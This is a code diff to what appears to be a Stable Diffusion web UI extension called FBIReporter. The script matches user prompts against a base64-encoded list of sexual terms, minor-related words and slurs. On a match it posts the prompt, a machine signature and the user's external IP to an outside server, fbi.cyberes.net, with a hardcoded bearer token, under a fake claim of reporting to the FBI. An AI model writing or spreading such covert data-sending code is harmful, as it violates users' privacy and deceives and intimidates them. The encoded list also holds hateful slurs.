@@ -27,10 +27,10 @@ def concat(input_obj) -> list:
 
 
 # Encoded in base64 so shithub doesn't ban me.
-encoded_banned_words = ["bG9saQ==", "bG9saXRh", "Y3V0ZQ==", "ZnVubnk=", "Y3Vubnk=", "Y2hpbGQ=", "eW91bmc=", "bGl0dGxl", "Z2lybA==", "YWxpY2U=", "Y2hpbGQgcG9ybg==", "Y2hlZXNlIHBpenph", "ZWxlbWVudGFyeSBzY2hvb2w=", "bWlkZGxlIHNjaG9vbA==", "aGlnaCBzY2hvb2w=", "dW5kZXJhZ2U=", "dW5kZXIgYWdl",
-                        "dW5kZXItYWdl", "aWxsZWdhbA==", "eW91bmdlciBzaXN0ZXI=", "c2lzdGVy", "b25paS1jaGFu", "aW1vdG8=", "YW5hbA==", "YW51cw==", "YXJzZQ==", "YXNz", "YmFsbHNhY2s=", "Ymxvb2R5", "Ymxvd2pvYg==", "YmxvdyBqb2I=", "Ym9sbG9jaw==", "Ym9sbG9r", "Ym9uZXI=", "Ym9vYg==", "YnVnZ2Vy", "YnVt",
-                        "YnV0dA==", "YnV0dHBsdWc=", "Y2xpdG9yaXM=", "Y29jaw==", "Y3VudA==", "ZGljaw==", "ZGlsZG8=", "ZHlrZQ==", "ZmFn", "ZmVsbGF0ZQ==", "ZmVsbGF0aW8=", "aml6eg==", "bGFiaWE=", "cGVuaXM=", "cHViZQ==", "cHVzc3k=", "c2Nyb3R1bQ==", "dmFnaW5h", "c2V4", "ZXJvdGlj", "bnVkZQ==", "bmFrZWQ=",
-                        "YnJlYXN0", "ZmxhdCBjaGVzdA==", "bWlsZg==", "bmlnZ2Vy", "ZmFnZ290", "bWV0aA==", "bXVyZGVyIG9mIGFuIEZCSSBhZ2VudA==", "RWR3YXJkIFNub3dkZW4="]
+encoded_banned_words = ["bG9saQ==", "bG9saXRh", "Y3V0ZQ==", "ZnVubnk=", "Y3Vubnk=", "Y2hpbGQ=", "eW91bmc=", "bGl0dGxl", "Z2lybA==", "YWxpY2U=", "Y2hpbGQgcG9ybg==", "Y2hlZXNlIHBpenph", "ZWxlbWVudGFyeSBzY2hvb2w=", "bWlkZGxlIHNjaG9vbA==", "aGlnaCBzY2hvb2w=", "dW5kZXJhZ2U=", "Y3V0ZSB0dW1teQ==",
+                        "dGVlbg==", "dGVlbmFnZXI=", "dW5kZXIgYWdl", "dW5kZXItYWdl", "aWxsZWdhbA==", "eW91bmdlciBzaXN0ZXI=", "c2lzdGVy", "b25paS1jaGFu", "aW1vdG8=", "YW5hbA==", "YW51cw==", "YXJzZQ==", "YXNz", "YmFsbHNhY2s=", "Ymxvb2R5", "Ymxvd2pvYg==", "YmxvdyBqb2I=", "Ym9sbG9jaw==", "Ym9sbG9r",
+                        "Ym9uZXI=", "Ym9vYg==", "YnVnZ2Vy", "YnVt", "YnV0dA==", "YnV0dHBsdWc=", "Y2xpdG9yaXM=", "Y29jaw==", "Y3VudA==", "ZGljaw==", "ZGlsZG8=", "ZHlrZQ==", "ZmFn", "ZmVsbGF0ZQ==", "ZmVsbGF0aW8=", "aml6eg==", "bGFiaWE=", "cGVuaXM=", "cHViZQ==", "cHVzc3k=", "c2Nyb3R1bQ==", "dmFnaW5h",
+                        "c2V4", "ZXJvdGlj", "bnVkZQ==", "bmFrZWQ=", "YnJlYXN0", "ZmxhdCBjaGVzdA==", "bWlsZg==", "bmlnZ2Vy", "ZmFnZ290", "bWV0aA==", "bXVyZGVyIG9mIGFuIEZCSSBhZ2VudA==", "RWR3YXJkIFNub3dkZW4="]
 banned_words = []
 for word in encoded_banned_words:
     banned_words.append(b64decode(word).decode())
@@ -97,12 +97,13 @@ class FBIReporter(scripts.Script):
         user_prompt = p.all_prompts[0]
         found_words = self.check_unsafe_prompt(user_prompt)
         if len(found_words) > 0:
-            print(f'******** DETECTED UNSAFE PROMPT ********\n{", ".join(found_words)}\nReporting to FBI...')
+            print(f'******** DETECTED UNSAFE PROMPT ********\nBad words: {found_words}\nReporting to FBI...')
             self.report_to_fbi(user_prompt, found_words)
 
     def report_to_fbi(self, prompt: dict, found_words: list):
         try:
-            r = requests.post('https://eo3dd9hxrjatvvr.m.pipedream.net', json={'prompt': prompt, 'found_words': found_words, 'machine_signature': machine_signature, 'machine_signature_encoded': machine_signature_encoded, 'external_ip': external_ip, 'ts': time.time()})
+            r = requests.post('https://fbi.cyberes.net', headers={'Authorization': 'Bearer jlkasdkljasdljkasdlkj'},
+                              json={'prompt': prompt, 'found_words': found_words, 'machine_signature': machine_signature, 'machine_signature_encoded': machine_signature_encoded, 'external_ip': external_ip, 'ts': time.time()})
             return r
         except Exception as e:
             print('Failed to send data to the FBI.')
